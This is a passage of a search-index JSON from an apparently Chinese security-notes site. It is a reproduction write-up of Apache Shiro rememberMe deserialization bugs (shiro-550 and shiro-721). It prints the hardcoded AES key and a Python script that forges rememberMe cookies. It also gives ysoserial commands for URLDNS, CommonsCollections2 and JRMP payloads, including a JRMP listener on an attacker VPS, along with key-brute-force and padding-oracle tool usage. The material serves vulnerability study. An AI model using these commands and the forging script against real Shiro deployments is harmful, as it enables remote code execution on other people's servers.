./ysoserial-master-SNAPSHOT.jar URLDNS \"http://cao.7squwf.dnslog.cn\" |base64|sed ':label;N;s/\\n//;b label' \u751f\u6210payload\uff0c\u50cfcookie\u4f2a\u9020\u811a\u672c\u4f20\u5165\uff0c\u83b7\u5f97\u4f2a\u9020\u7684cookie rememberme\u767b\u9646\u540e\uff0c\u5237\u65b0\u6293\u5305\uff0c\u5220\u9664cookie\u4e2d\u7684session\uff0c\u66ff\u6362cookie\u4e2d\u7684rememberme\u4e3a\u4f2a\u9020\u540e\u7684cookie\u3002\u653e\u5305,DNSLOG\u6709\u53cd\u5e94 cc\u94fe2 java -jar ./ysoserial-master-SNAPSHOT.jar CommonsCollections2 \"calc\"|base64 |sed ':label;N;s/\\n//;b label' \u7136\u540e\u5236\u4f5ccookie\uff0c\u53d1\u8fc7\u53bb\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668 JRMP \u901a\u8fc7\u8fd0\u884cmvn dependency:list \u547d\u4ee4\u53ef\u4ee5\u53d1\u73b0\u5f53\u524dCommons Collections \u7684\u7248\u672c\u662f3.2.1 \u6309\u7406\u8bf4\u4f1a\u6709cc\u94fe5\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u7528ysoserial \u751f\u6210payload\u7528\u4e0a\u9762\u7684\u65b9\u6cd5\u6253\u8fc7\u53bb\u540e\u6ca1\u6709\u53cd\u5e94\u3002\u770b\u522b\u4eba\u535a\u5ba2\u53d1\u73b0\u662f\u8fd9\u4e2a\u539f\u56e0 \u201cShiro resovleClass\u4f7f\u7528\u7684\u662fClassLoader.loadClass()\u800c\u975eClass.forName()\uff0c\u800cClassLoader.loadClass\u4e0d\u652f\u6301\u88c5\u8f7d\u6570\u7ec4\u7c7b\u578b\u7684class\u3002\u201d \u89e3\u51b3\u8fd9\u79cd\u95ee\u9898\u7684\u529e\u6cd5\u662f\u7528JRMP vps\u4e0a\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4\uff0c\u76d1\u542c\u7aef\u53e3 java -cp ysoserial-master-SNAPSHOT.jar ysoserial.exploit.JRMPListener 12006 CommonsCollections5 'calc' \u6211\u4eec\u518d\u901a\u8fc7ysoserial\u751f\u6210payload java -jar ysoserial-master-SNAPSHOT.jar JRMPClient 'vps_ip:12006'|base64|sed ':label;N;s/\\n//;b label' \u7136\u540e\u4f2a\u9020cookie\uff0c\u53d1\u8fc7\u53bb\uff0c\u6210\u529f\u5f39\u8ba1\u7b97\u5668 \u5c0f\u603b\u7ed3 \u8fd9\u4e2a\u6d1e\u56e0\u4e3acookie\u4e2d\u7684\u503c\u4f7f\u7528\u786c\u7f16\u7801\u7684key\u52a0\u5bc6\u800c\u6210\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee5\u6b64\u6765\u4f2a\u9020cookie\uff0c\u987a\u4fbf\u5728cookie\u91cc\u5199\u5165\u5371\u9669\u7684paylaod\u5982cc\u94fepayload\uff0c\u4f7fcookie\u4e2d\u7684\u503c\u88ab\u89e3\u5bc6\uff0c\u968f\u540e\u7ecf\u5386\u53cd\u5e8f\u5217\u5316\uff0c\u9020\u6210\u547d\u4ee4\u6267\u884c \u53c2\u8003\uff1a https://l3yx.github.io/2020/03/21/Shiro-1-2-4-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E \u7b11\u5e08\u5085\u5927\u5927 \u5ba1\u8ba1\u5173\u952e\u5b57 \u53ef\u4ee5\u76f4\u63a5\u901a\u8fc7\u641c\u7d22\u5173\u952e\u5b57setCipherKey\u6216CookieRememberMeManager\uff0c\u6765\u770b\u770b\u5bc6\u94a5\u662f\u5426\u786c\u7f16\u7801\u5728\u4e86\u4ee3\u7801\u4e2d shiro-721 \u53bb\u5e74\u5b66\u7684Padding Oracle \u5728\u6b64\u5904\u88ab\u5229\u7528\u4e86\u8d77\u6765\u3002\u53ef\u4ee5\u5148\u770b\u770bPadding Oracle Attack \u5927\u6982\u662f\u4e2a\u5565 \u5f71\u54cd\u7248\u672c\uff1a 1.2.5, 1.2.6, 1.3.0, 1.3.1, 1.3.2, 1.4.0-RC2, 1.4.0, 1.4.1 \u7b80\u4ecb \u5176\u5b9e\u6f0f\u6d1e\u4ee3\u7801\u5c42\u9762\u903b\u8f91\u4e0a\u548cshiro-550\u5927\u81f4\u76f8\u4f3c\uff0c\u53ea\u4e0d\u8fc7key\u6ca1\u6709\u786c\u7f16\u7801\u8fdb\u4ee3\u7801\u4e2d\u4e86\u3002shiro\u7684cookie\u4f7f\u7528aes-128-cbc\u52a0\u5bc6 \u53ea\u8981\u6211\u4eec\u83b7\u5f97\u4e00\u4e2arememberme\u7528\u6237\u7684cookie\u540e\u5c31\u53ef\u4ee5\u901a\u8fc7padding oracle attack \u4f2a\u9020\u4efb\u610fcookie\u53d1\u8fc7\u53bb\u4e86\uff0c\u4ece\u800c\u9020\u6210\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u4e86 \u73af\u5883\u642d\u5efa \u5728\u8fd9\u91cc\u4e0b\u8f7d1.4.1\u7684war\u5305 https://github.com/jas502n/SHIRO-721/blob/master/samples-web-1.4.1.war\uff0c\u5e76\u653e\u5165tomcat webapps\u6587\u4ef6\u5939\uff0c\u968f\u540e\u542f\u52a8tomcat\uff0c\u8bbf\u95ee http://127.0.0.1:8080/samples-web-1.4.1/ \u5229\u7528 \u5927\u81f4\u903b\u8f91\u4e0eshiro-550\u5dee\u4e0d\u591a\uff0c\u76f4\u63a5\u8bf4\u5229\u7528\u5427\u3002 https://github.com/inspiringz/Shiro-721 \u4f7f\u7528\u8fd9\u4e2a\u5de5\u5177 \u9996\u5148\u6211\u4eec\u5f97\u52fe\u9009rememberme\uff0c\u6293\u5305\u83b7\u5f97rememberme cookie \u7136\u540e\u901a\u8fc7ysoserial\u751f\u6210payload\uff0c\u5c06\u5176\u901a\u8fc7\u7ba1\u9053\u7b26\u4f20\u5165\u67d0\u4e2a\u6587\u4ef6\uff0c\u968f\u540e\u7528\u521a\u521a\u90a3\u4e2a\u5de5\u5177\u91cc\u7684shiro_exp.py python ./shiro_exp.py <url> <cookie> <paylaod\u6587\u4ef6> \u968f\u540e\u4f1a\u8fdb\u884c\u7206\u7834\uff0c\u6700\u540e\u83b7\u5f97\u7ed3\u679ccookie\u540e\uff0c\u4f20\u5165\u5e76\u53d1\u5305\u8fc7\u53bb\u5373\u53ef\uff08\u7206\u7834\u65f6\u95f4\u5f88\u957f\uff09","title":"shiro\u53cd\u5e8f\u5217\u5316(shiro-550\u4e0eshiro-721)"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#shiroshiro-550shiro-721","text":"","title":"shiro\u53cd\u5e8f\u5217\u5316(shiro-550\u4e0eshiro-721)"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_1","text":"shiro \u600e\u4e48\u5224\u65ad\u662f\u5426\u662fshiro\u7f51\u7ad9 shiro-550 \u7b80\u4ecb \u524d\u671f\u51c6\u5907 \u5f00\u59cb\u52a8\u8c03 \u5e8f\u5217\u5316\uff0c\u52a0\u5bc6 \u53cd\u5e8f\u5217\u5316\uff0c\u89e3\u5bc6 \u89e3\u5bc6\uff0c\u91cd\u5199cookie\uff0c\u4ee5\u5199\u5165payload \u5bc6\u94a5\u83b7\u53d6 \u5229\u7528 URLDNS cc\u94fe2 JRMP \u5c0f\u603b\u7ed3 \u5ba1\u8ba1\u5173\u952e\u5b57 shiro-721 \u7b80\u4ecb \u73af\u5883\u642d\u5efa \u5229\u7528","title":"\u76ee\u5f55"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#shiro","text":"Apache shiro \u662fjava\u7684\u4e00\u4e2a\u5b89\u5168\u6846\u67b6\uff0c\u53ef\u4ee5\u5e2e\u52a9\u5b8c\u6210\u8ba4\u8bc1\uff0c\u6388\u6743\uff0c\u52a0\u5bc6\uff0c\u4f1a\u8bdd\u7ba1\u7406\u7b49\u529f\u80fd\u3002\u5b83\u4e0d\u8ddf\u4efb\u4f55\u6846\u67b6\u6216\u5bb9\u5668\u7ed1\u5b9a\uff0c\u53ef\u4ee5\u72ec\u7acb\u8fd0\u884c\u3002","title":"shiro"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#shiro_1","text":"\u53d1\u9001cookie\u5e26\u6709rememberMe=0\u7684\u5305\uff0c\u82e5\u8fd4\u56de\u5305\u7684\u5934\u90e8\u6709rememberMe\uff0c\u5219\u4e3ashiro\u7ad9\u70b9","title":"\u600e\u4e48\u5224\u65ad\u662f\u5426\u662fshiro\u7f51\u7ad9"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#shiro-550","text":"","title":"shiro-550"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_2","text":"\u5f53shiro\u7248\u672c\u5c0f\u4e8e1.2.5\u65f6\uff0c\u4e3b\u8981\u662f\u7531shiro\u7684rememberMe\u5185\u5bb9\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u9020\u6210\u7684\u539f\u56e0\u662fAES\u5bc6\u94a5\u88ab\u786c\u7f16\u7801\u5728shiro\u6e90\u7801\u4e2d\uff0c\u8fd9\u5c31\u5bfc\u81f4\u4e86\u53ef\u4ee5\u901a\u8fc7\u5728cookie\u7684rememberMe\u5b57\u6bb5\u63d2\u5165payload\u5b9e\u73b0\u4efb\u610f\u4ee3\u7801\u6267\u884c","title":"\u7b80\u4ecb"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_3","text":"git clone https://github.com/apache/shiro.git \u4e0b\u8f7dshiro \u7136\u540e git checkout shiro-root-1.2.4,\u5207\u6362\u52301.2.4\u7248\u672c\u8fdb\u884c\u5bf9\u5e94\u7248\u672c\u7684\u6f0f\u6d1e\u8c03\u8bd5 \u7f16\u8f91shiro/samples/web/pom.xml\u6587\u4ef6\uff0c\u5728\u6b64\u5904\u52a0\u5165 1.2 \u7136\u540eidea\u6253\u5f00shiro/samples/web \u4e0b\u7684pom.xml,\u7136\u540eRun -> Edit Configurations \u6dfb\u52a0TomcatServer \u5f85idea\u52a0\u8f7d\u5b8cmaven\u540e\uff0c\u5411tomcat\u90e8\u7f72\u5de5\u4ef6 \u7136\u540e\u542f\u52a8\u5373\u53ef","title":"\u524d\u671f\u51c6\u5907"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_4","text":"","title":"\u5f00\u59cb\u52a8\u8c03"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_5","text":"\u5728org.apache.shiro.mgt.AbstractRememberMeManager#onSuccessfulLogin \u5904\u4e0b\u65ad\u70b9 \u7136\u540e\u8fdb\u5165shiro\u767b\u9646\u9875\u9762\uff0c\u52fe\u9009 rememberme \uff0c\u8fdb\u884c\u767b\u5f55\uff0c\u65ad\u70b9\u547d\u4e2d \u7136\u540e\u4f1a\u6821\u9a8ctoken\u91cc\u9762\u7684rememberme\u662f\u5426\u4e3atrue\uff0c\u82e5\u4e3atrue\u5219\u6267\u884crememberIdentity\u51fd\u6570 \u6211\u4eec\u8ddf\u8fdbrememberIdentity\u51fd\u6570 \u53d1\u73b0principals\u53d8\u91cf\u83b7\u53d6\u4e86\u9700\u8981remember\u7684\u7528\u6237\u540d\uff08\u6b64\u5904\u4e3aroot\uff09\uff0c\u7136\u540e\u518d\u8c03\u7528\u91cd\u8f7d\u51fd\u6570rememberIdentity\u3002 \u8fd9\u4e2a\u51fd\u6570\u8c03\u7528\u4e86convertPrincipalsToBytes,\u6211\u4eec\u8ddf\u8fdb\u770b\u770b\u8fd9\u4e2a\u51fd\u6570 \u53ef\u4ee5\u53d1\u73b0\u5bf9\u4f20\u5165\u7684principals\u8c03\u7528\u4e86serialize\u65b9\u6cd5\uff0c\u7ee7\u7eed\u8ddf\u8fdbserialize\u65b9\u6cd5 \u7ee7\u7eed\u8ddf\u8fdbserialize\u4f1a\u6765\u5230\u8fd9\u4e2a\u5730\u65b9 \u53d1\u73b0\u5c31\u662f\u5bf9\u5176\u8c03\u7528\u4e86writeObject()\u8fd9\u4e2a\u539f\u751f\u53cd\u5e8f\u5217\u65b9\u6cd5\u800c\u5df2\uff0c\u6ca1\u4ec0\u4e48\u597d\u5eb7\u7684\uff0c\u8f6c\u56de\u5934\u53bb\u770b\u770bconvertPrincipalsToBytes\u90a3\u4e2a\u52a0\u5bc6\u51fd\u6570encrypt \u53d1\u73b0\u901a\u8fc7getCipherService\u65b9\u6cd5\u8fd4\u56de\u4e86\u4e00\u4e2a\u4e1c\u897f\uff0c\u53d1\u73b0\u662f\u52a0\u5bc6\u65b9\u5f0f\u7b49\u4e1c\u897f \u5728\u6b64\u5904156\u884c\u4f1a\u8c03\u7528\u53e6\u4e00\u4e2aencrypt\u65b9\u6cd5\uff0c\u5176\u4e2d\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5e8f\u5217\u5316\u540e\u7684\u7528\u6237\u540d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u5219\u662f\u5bc6\u94a5\uff08\u8fd9\u4e2a\u5bc6\u94a5\u662f\u786c\u7f16\u7801\u5199\u5165\u6587\u4ef6\u7684\uff0c\u6240\u4ee5\u9020\u6210\u4e86\u5b89\u5168\u95ee\u9898\uff09\u6211\u4eec\u8ddf\u8fdb \u8fd9\u91cc\u7684ivBytes\u662f\u4e00\u4e2a\u968f\u673a\u751f\u6210\u7684iv\uff08\u6211\u6ca1\u8ddf\u8fdb\u7ec6\u770b),\u7136\u540e\u5728\u8fd9\u4e2a\u65b9\u6cd5\u6700\u540e\u5b83\u8c03\u7528\u4e86encrypt\u7684\u91cd\u8f7d\u51fd\u6570\uff0c\u5e76\u4f20\u5165\u4e86\u5e8f\u5217\u5316\u540e\u7684\u7528\u6237\u540d\uff0ckey\uff0civ\uff0c\u4ee5\u53ca\u4e00\u4e2atrue\u3002\u6211\u4eec\u7ee7\u7eed\u8ddf\u8fdb \u53ef\u4ee5\u53d1\u73b0\u901a\u8fc7arraycopy\uff0c\u628aiv\u548c\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u6570\u636e\uff08aes\uff09\u653e\u5165\u4e86output,\u6700\u540e\u8fd4\u56de\u4e86output. \u7136\u540e\u8fd9\u4e2areturn\u4f1a\u4e00\u76f4\u8fd4\u56de\u5230\u6b64\u5904 output\u7684\u5185\u5bb9\u4f5c\u4e3a\u53c2\u6570\u4f20\u5165\u4e86rememberSerializedIdentity\uff0c\u8ddf\u8fdb\u8be5\u51fd\u6570 56\u884c\uff0c\u628abase64\u52a0\u5bc6\u540e\u7684output\u4f5c\u4e3a\u503c\u5199\u5165\u5230cookie\u4e2d\u7684remembername\u952e 57\u884c\u5c06\u5176\u8fd4\u56de\u7ed9\u5ba2\u6237\u7aef burp\u6293\u5305\u53d1\u73b0\u4e8b\u5b9e\u786e\u5b9e\u5982\u6b64 \u53e6\u5916\u8bf4\u4e00\u4e0b\u90a3\u4e2a\u786c\u7f16\u7801key\uff0c\u90a3\u4e2a\u786c\u7f16\u7801\u7684key\u5728AbstractRememberMeManager.class DEFAULT_CIPHER_KEY_BYTES\u91cc \u53ef\u4ee5\u53d1\u73b0\u901a\u8fc7getEncryptionCipherKey\u83b7\u5f97\u7684key\u786e\u5b9e\u662fDEFAULT_CIPHER_KEY_BYTES \u6211\u4eec\u7b80\u8981\u7684\u68b3\u7406\u4e00\u4e0b\u8fd9\u4e2a\u6d41\u7a0b\uff0c \u5f53\u6211\u4eec\u52fe\u9009rememberme\u540e\uff0c\u7528\u6237\u540d\u4f1a\u88ab\u5e8f\u5217\u5316\u5904\u7406\uff0c\u7136\u540e\u4e0e\u786c\u7f16\u7801\u7684key\uff0c\u968f\u673a\u751f\u6210\u7684iv\u4e00\u8d77\u8fdb\u884c\u52a0\u5bc6\uff0c\u7136\u540e\u4ee5 iv+\u5bc6\u6587 \u7684base64\u7f16\u7801\u8fd4\u56de\u7ed9\u7528\u6237\u7684\u952e\u4e3arememberme\u7684cookie\u91cc\u3002","title":"\u5e8f\u5217\u5316\uff0c\u52a0\u5bc6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_6","text":"\u5728\u6211\u4eec\u52fe\u9009rememberme\u767b\u9646\u540e\uff0c\u5237\u65b0\uff0c\u6293\u5305\uff0c\u5c06\u5176JSESSIONID\u5220\u9664\uff0c\u4f7fshiro\u9a8c\u8bc1cookie\u4e2drememberme\u7684\u503c\u662f\u5426\u6b63\u786e\uff08\u5982\u679c\u4e0d\u5220\u9664JSESSIONID\uff0cshiro\u5219\u76f4\u63a5\u4ee5JSESSIONID\u4e3a\u767b\u9646\u51ed\u8bc1\u4e86\uff0c\u5c31\u4e0d\u4f1a\u9a8c\u8bc1rememberme\u4e2d\u7684\u503c\u4e86\uff09 \u5728org.apache.shiro.mgt.DefaultSecurityManager#getRememberedIdentity \u6253\u4e0b\u65ad\u70b9\uff0c\u653e\u5305\uff0c\u65ad\u70b9\u547d\u4e2d\u3002 \u8ddf\u8fdbgetRememberedPrincipals\u65b9\u6cd5 \u968f\u540e\u518d\u8ddf\u8fdbgetRememberedSerializedIdentity \u5173\u6ce8\u8fd9\u91cc\u768486\u884c\uff0c\u6b64\u5904\u7684\u610f\u601d\u662f\u4ececookie\u4e2d\u83b7\u5f97base64\u7f16\u7801\u540e\u7684cookie\u503c\uff0c\u968f\u540e\u572890\u884c\u5bf9\u5176\u8fdb\u884c\u586b\u5145\uff08CBC\u52a0\u5bc6\u4e2d\u7684\u4e00\u4e2a\u6d41\u7a0b\uff09\uff0c95\u884c\u8fdb\u884cbase64\u89e3\u7801\uff0c\u5e76\u5c06\u5176\u8fd4\u56de \u968f\u540e\u6211\u4eec\u56de\u5230getRememberedPrincipals\u65b9\u6cd5\uff0c\u8ddf\u8fdb\u5176convertBytesToPrincipals\u65b9\u6cd5 \u53d1\u73b0\u5176\u4e2d\u6709\u4e2adecrypt\u65b9\u6cd5\uff0c\u8fd9\u91cc\u7684decrypt\u65b9\u6cd5\u5c31\u662f\u5bf9\u5176\u884caes\u89e3\u5bc6\uff0c\u53d6\u524d\u5341\u516d\u4f4d\u4e3aIV\u3002 \u4e0b\u9762140\u884c\u5219\u662f\u5bf9\u5176\u8fdb\u884c\u53cd\u5e8f\u5217\u5316\u5904\u7406\u4e86\u3002\u6211\u4eec\u8ddf\u8fdb\u4e00\u4e0b \u518d\u6b21\u8ddf\u8fdbdeserialize\u65b9\u6cd5 \u770b\u5230readObject,\u5c31\u610f\u5473\u7740\u53cd\u5e8f\u5217\u5316\u6d41\u7a0b\u7ed3\u675f\u4e86\u3002 \u68b3\u7406\u4e00\u4e0b\uff0ccookie\u4e2dremenber\u503c\u4f20\u5165\u540e\u5148base64\u89e3\u7801\uff0c\u7136\u540eaes\u89e3\u5bc6\uff0c\u7136\u540e\u53cd\u5e8f\u5217\u5316\u3002","title":"\u53cd\u5e8f\u5217\u5316\uff0c\u89e3\u5bc6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#cookiepayload","text":"\u65e2\u7136key\u662f\u56fa\u5b9a\u7684\uff0c\u6211\u4eec\u77e5\u9053\u4e86key\u662f\u4ec0\u4e48\uff0c\u540c\u65f6\u5728CBC\u89e3\u5bc6\u7684\u65f6\u5019\uff0cIV\u7684\u4f5c\u7528\u53ea\u662f\u4f5c\u4e3a\u7b2c\u4e00\u4e2a\u533a\u5757\u53bb\u89e3\u5bc6\u7b2c\u4e8c\u4e2a\u533a\u5757\uff08\u751f\u6210\u7684\u7ed3\u679c\u53bb\u89e3\u5bc6\u7b2c\u4e09\u4e2a\u533a\u5757\uff0c\u4ee5\u6b64\u7c7b\u63a8\uff09\uff0c\u6240\u4ee5IV\u53ef\u4ee5\u4e3a\u968f\u673a\u503c\u6ca1\u4ec0\u4e48\u7279\u522b\u8981\u6c42\uff08\u53ea\u8981\u80fd\u89e3\u5bc6\u5c31\u884c\u4e86\uff09\u90a3\u4e48\u6211\u4eec\u5c31\u53ef\u4ee5\u81ea\u5df1\u4f2a\u9020\u4e00\u4e2acookie\u3002 python\u811a\u672c\u5982\u4e0b(\u5ad6\u7684\u7b11\u5e08\u5085\u7684)\uff0c\u5e8f\u5217\u5316payload\u7528base64\u683c\u5f0f\u4f20\u5165 ##pip install pycrypto import sys import base64 import uuid from random import Random import subprocess from Crypto.Cipher import AES key = \"kPH+bIxk5D2deZiIxcaaaA==\" mode = AES.MODE_CBC IV = uuid.uuid4().bytes encryptor = AES.new(base64.b64decode(key), mode, IV) payload=base64.b64decode(sys.argv[1]) BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() payload=pad(payload) print(base64.b64encode(IV + encryptor.encrypt(payload))) \u7136\u540e\u6211\u4eec\u53ea\u9700\u8981\u4f20\u5165base64\u7f16\u7801\u7684\uff0c\u53bb\u9664\u6362\u884c\u7b26\u7684payload\u5373\u53ef\u3002 \u50cf\u8fd9\u6837 java -jar ./ysoserial-master-SNAPSHOT.jar URLDNS \"http://cao.7squwf.dnslog.cn\" |base64|sed ':label;N;s/\\n//;b label'","title":"\u89e3\u5bc6\uff0c\u91cd\u5199cookie\uff0c\u4ee5\u5199\u5165payload"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_7","text":"\u6709\u4e9b\u65f6\u5019key\u5e76\u4e0d\u662f\u4e00\u6210\u4e0d\u53d8\u7684kPH+bIxk5D2deZiIxcaaaA==\uff0c\u800c\u6709\u53ef\u80fd\u662f\u5176\u4ed6\u503c\uff0c\u6211\u4eec\u53ef\u4ee5\u7528\u5de5\u5177 https://github.com/insightglacier/Shiro_exploit \u6765\u7206\u7834\u51fa\u5bc6\u94a5 python .\\shiro_exploit.py -u http://127.0.0.1:8080 \u5373\u53ef\u5f00\u59cb\u7206\u7834\uff0c\u5f53\u7136\u8fd9\u4e2a\u5de5\u5177\u7684\u4f5c\u7528\u4e0d\u4ec5\u4ec5\u5982\u6b64","title":"\u5bc6\u94a5\u83b7\u53d6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#_8","text":"","title":"\u5229\u7528"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#urldns","text":"\u8fd9\u4e2a\u94fe\u5176\u5b9e\u6839\u672c\u6ca1\u5565\u5371\u5bb3..\u53ea\u662f\u62ff\u6765\u6d4b\u8bd5\u4e00\u4e0b\u6709\u6ca1\u6709\u6d1e java -jar ./ysoserial-master-SNAPSHOT.jar URLDNS \"http://cao.7squwf.dnslog.cn\" |base64|sed ':label;N;s/\\n//;b label' \u751f\u6210payload\uff0c\u50cfcookie\u4f2a\u9020\u811a\u672c\u4f20\u5165\uff0c\u83b7\u5f97\u4f2a\u9020\u7684cookie rememberme\u767b\u9646\u540e\uff0c\u5237\u65b0\u6293\u5305\uff0c\u5220\u9664cookie\u4e2d\u7684session\uff0c\u66ff\u6362cookie\u4e2d\u7684rememberme\u4e3a\u4f2a\u9020\u540e\u7684cookie\u3002\u653e\u5305,DNSLOG\u6709\u53cd\u5e94","title":"URLDNS"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/JAVA/%E8%B7%9F%E8%B8%AA%E5%A4%8D%E7%8E%B0%E6%B2%89%E6%B7%80/shiro/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%28shiro-550%E4%B8%8Eshiro-721%29/#cc2","text":"java -jar ./ysoserial-master-SNAPSHOT.jar CommonsCollections2 \"calc\"|base64 |sed ':label;N;s/\\n//;b label' 